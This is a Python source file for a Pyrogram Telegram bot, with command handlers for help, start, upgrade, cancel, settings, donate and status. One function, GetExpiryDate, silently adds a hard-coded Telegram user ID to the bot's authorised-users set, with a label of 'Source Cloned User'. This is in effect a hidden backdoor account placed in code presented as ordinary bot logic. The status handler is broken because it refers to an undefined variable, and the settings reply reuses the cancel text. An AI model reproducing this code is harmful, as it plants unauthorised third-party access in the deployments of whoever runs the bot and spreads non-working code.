#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name), 
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
        [
          [
          InlineKeyboardButton('My Father 👨‍💻', url='https://t.me/Ns_AnoNymous'),
          InlineKeyboardButton('Discuss 🗣', url='https://t.me/anonymousbotdiscussion')
          ],
          [
          InlineKeyboardButton('Updates channel 📢', url='https://t.me/anonymousbotupdates'),
          InlineKeyboardButton('Rate Me ⭐', url='https://t.me/anonymousbotdiscussion/215')
          ]
        ]
      )
    )
    return 

@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["cancel"]))
async def cancel(bot, update):
       if update.reply_to_message is not None:
               await bot.send_message(
                     chat_id=update.chat.id,
                     text="Sorry bro I cannot cancel this process now 😔",
                     reply_to_message_id=update.message_id,
                  )


@pyrogram.Client.on_message(pyrogram.Filters.command(["settings"]))
async def settings(bot, update):
               await bot.send_message(
                     chat_id=update.chat.id,
                     text="Sorry bro I cannot cancel this process now 😔",
                     #reply_to_message_id=update.message_id,
                     reply_markup=InlineKeyboardMarkup(
             [
                [  # First row
                    InlineKeyboardButton(  # Generates a callback query when pressed
                        "Button",
                        callback_data="start"
                  )
                ]
             ]
           )
         )
@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
async def donate(bot, update):
       await bot.send_message(
             chat_id=update.chat.id,
             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
             reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/maheshmalekar')
               ]
             ]
           )
          )
@pyrogram.Client.on_message(pyrogram.Filters.command("status"))
async def sts(bot, update):
    
    total_users = await bot.db.total_users_count()
    await m.reply_text(text=f"No of users : {total_users}", quote=True)
